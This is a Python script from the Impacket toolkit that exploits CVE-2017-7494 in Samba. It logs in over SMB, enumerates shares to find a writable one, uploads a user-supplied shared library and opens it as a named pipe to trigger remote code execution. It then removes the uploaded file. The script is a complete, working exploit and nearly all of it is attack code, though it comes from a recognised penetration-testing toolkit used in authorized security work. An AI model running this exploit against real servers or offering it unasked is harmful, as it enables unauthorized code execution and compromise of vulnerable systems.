#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through
#   the -so parameter.
#
#   The script will use SMB1 or SMB2/3 depending on the target's availability. Also, the target share pathname is
#   retrieved by using NetrShareEnum() API with info level 2.
#
#   Example:
#
#   ./sambaPipe.py -so poc/libpoc.linux64.so bill@10.90.1.1
#
#   It will upload the libpoc.linux64.so file located in the poc directory against the target 10.90.1.1. The username
#   to use for authentication will be 'bill' and the password will be asked.
#
#   ./sambaPipe.py -so poc/libpoc.linux64.so 10.90.1.1
#
#   Same as before, but anonymous authentication will be used.
#
# Author:
#   beto (@agsolino)
#

import argparse
import logging
import sys
from os import path

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.nt_errors import STATUS_SUCCESS
from impacket.smb import FILE_OPEN, SMB_DIALECT, SMB, SMBCommand, SMBNtCreateAndX_Parameters, SMBNtCreateAndX_Data, \
    FILE_READ_DATA, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE, FILE_WRITE_DATA, FILE_DIRECTORY_FILE
from impacket.smb3structs import SMB2_IL_IMPERSONATION, SMB2_CREATE, SMB2_FLAGS_DFS_OPERATIONS, SMB2Create, SMB2Packet, \
    SMB2Create_Response, SMB2_OPLOCK_LEVEL_NONE, SMB2_SESSION_FLAG_ENCRYPT_DATA
from impacket.smbconnection import SMBConnection


class PIPEDREAM:
    def __init__(self, smbClient, options):
        self.__smbClient = smbClient
        self.__options = options

    def isShareWritable(self, shareName):
        logging.debug('Checking %s for write access' % shareName)
        try:
            logging.debug('Connecting to share %s' % shareName)
            tid = self.__smbClient.connectTree(shareName)
        except Exception as e:
            logging.debug(str(e))
            return False

        try:
            self.__smbClient.openFile(tid, '\\', FILE_WRITE_DATA, creationOption=FILE_DIRECTORY_FILE)
            writable = True
        except Exception:
            writable = False
            pass

        return writable

    def findSuitableShare(self):
        from impacket.dcerpc.v5 import transport, srvs
        rpctransport = transport.SMBTransport(self.__smbClient.getRemoteName(), self.__smbClient.getRemoteHost(),
                                              filename=r'\srvsvc', smb_connection=self.__smbClient)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(srvs.MSRPC_UUID_SRVS)
        resp = srvs.hNetrShareEnum(dce, 2)
        for share in resp['InfoStruct']['ShareInfo']['Level2']['Buffer']:
            if self.isShareWritable(share['shi2_netname'][:-1]):
                sharePath = share['shi2_path'].split(':')[-1:][0][:-1]
                return share['shi2_netname'][:-1], sharePath

        raise Exception('No suitable share found, aborting!')

    def uploadSoFile(self, shareName):
        # Let's extract the filename from the input file pathname
        fileName = path.basename(self.__options.so.replace('\\', '/'))
        logging.info('Uploading %s to target' % fileName)
        fh = open(self.__options.so, 'rb')
        self.__smbClient.putFile(shareName, fileName, fh.read)
        fh.close()
        return fileName

    def create(self, treeId, fileName, desiredAccess, shareMode, creationOptions, creationDisposition, fileAttributes,
               impersonationLevel=SMB2_IL_IMPERSONATION, securityFlags=0, oplockLevel=SMB2_OPLOCK_LEVEL_NONE,
               createContexts=None):

        packet = self.__smbClient.getSMBServer().SMB_PACKET()
        packet['Command'] = SMB2_CREATE
        packet['TreeID'] = treeId
        if self.__smbClient._SMBConnection._Session['TreeConnectTable'][treeId]['IsDfsShare'] is True:
            packet['Flags'] = SMB2_FLAGS_DFS_OPERATIONS

        smb2Create = SMB2Create()
        smb2Create['SecurityFlags'] = 0
        smb2Create['RequestedOplockLevel'] = oplockLevel
        smb2Create['ImpersonationLevel'] = impersonationLevel
        smb2Create['DesiredAccess'] = desiredAccess
        smb2Create['FileAttributes'] = fileAttributes
        smb2Create['ShareAccess'] = shareMode
        smb2Create['CreateDisposition'] = creationDisposition
        smb2Create['CreateOptions'] = creationOptions

        smb2Create['NameLength'] = len(fileName) * 2
        if fileName != '':
            smb2Create['Buffer'] = fileName.encode('utf-16le')
        else:
            smb2Create['Buffer'] = b'\x00'

        if createContexts is not None:
            smb2Create['Buffer'] += createContexts
            smb2Create['CreateContextsOffset'] = len(SMB2Packet()) + SMB2Create.SIZE + smb2Create['NameLength']
            smb2Create['CreateContextsLength'] = len(createContexts)
        else:
            smb2Create['CreateContextsOffset'] = 0
            smb2Create['CreateContextsLength'] = 0

        packet['Data'] = smb2Create

        packetID = self.__smbClient.getSMBServer().sendSMB(packet)
        ans = self.__smbClient.getSMBServer().recvSMB(packetID)
        if ans.isValidAnswer(STATUS_SUCCESS):
            createResponse = SMB2Create_Response(ans['Data'])

            # The client MUST generate a handle for the Open, and it MUST
            # return success and the generated handle to the calling application.
            # In our case, str(FileID)
            return str(createResponse['FileID'])

    def openPipe(self, sharePath, fileName):
        # We need to overwrite Impacket's openFile functions since they automatically convert paths to NT style
        # to make things easier for the caller. Not this time ;)
        treeId = self.__smbClient.connectTree('IPC$')
        sharePath = sharePath.replace('\\', '/')
        pathName = '/' + path.join(sharePath, fileName)
        logging.info('Final path to load is %s' % pathName)
        logging.info('Triggering bug now, cross your fingers')

        if self.__smbClient.getDialect() == SMB_DIALECT:
            _, flags2 = self.__smbClient.getSMBServer().get_flags()

            pathName = pathName.encode('utf-16le') if flags2 & SMB.FLAGS2_UNICODE else pathName

            ntCreate = SMBCommand(SMB.SMB_COM_NT_CREATE_ANDX)
            ntCreate['Parameters'] = SMBNtCreateAndX_Parameters()
            ntCreate['Data'] = SMBNtCreateAndX_Data(flags=flags2)
            ntCreate['Parameters']['FileNameLength'] = len(pathName)
            ntCreate['Parameters']['AccessMask'] = FILE_READ_DATA
            ntCreate['Parameters']['FileAttributes'] = 0
            ntCreate['Parameters']['ShareAccess'] = FILE_SHARE_READ
            ntCreate['Parameters']['Disposition'] = FILE_NON_DIRECTORY_FILE
            ntCreate['Parameters']['CreateOptions'] = FILE_OPEN
            ntCreate['Parameters']['Impersonation'] = SMB2_IL_IMPERSONATION
            ntCreate['Parameters']['SecurityFlags'] = 0
            ntCreate['Parameters']['CreateFlags'] = 0x16
            ntCreate['Data']['FileName'] = pathName

            if flags2 & SMB.FLAGS2_UNICODE:
                ntCreate['Data']['Pad'] = 0x0

            return self.__smbClient.getSMBServer().nt_create_andx(treeId, pathName, cmd=ntCreate)
        else:
            return self.create(treeId, pathName, desiredAccess=FILE_READ_DATA, shareMode=FILE_SHARE_READ,
                               creationOptions=FILE_OPEN, creationDisposition=FILE_NON_DIRECTORY_FILE, fileAttributes=0)

    def run(self):
        logging.info('Finding a writeable share at target')

        shareName, sharePath = self.findSuitableShare()

        logging.info('Found share %s with path %s' % (shareName, sharePath))

        fileName = self.uploadSoFile(shareName)

        logging.info('Share path is %s' % sharePath)
        try:
            self.openPipe(sharePath, fileName)
        except Exception as e:
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                logging.info('Expected STATUS_OBJECT_NAME_NOT_FOUND received, doesn\'t mean the exploit worked tho')
            else:
                logging.info('Target likely not vulnerable, Unexpected %s' % str(e))
        finally:
            logging.info('Removing file from target')
            self.__smbClient.deleteFile(shareName, fileName)


# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Samba Pipe exploit")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-so', action='store', required = True, help='so filename to upload and load')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    try:
        smbClient = SMBConnection(address, options.target_ip, sess_port=int(options.port))#, preferredDialect=SMB_DIALECT)
        if options.k is True:
            smbClient.kerberosLogin(username, password, domain, lmhash, nthash, options.aesKey, options.dc_ip)
        else:
            smbClient.login(username, password, domain, lmhash, nthash)

        if smbClient.getDialect() != SMB_DIALECT:
            # Let's disable SMB3 Encryption for now
            smbClient._SMBConnection._Session['SessionFlags'] &=  ~SMB2_SESSION_FLAG_ENCRYPT_DATA
        pipeDream = PIPEDREAM(smbClient, options)
        pipeDream.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
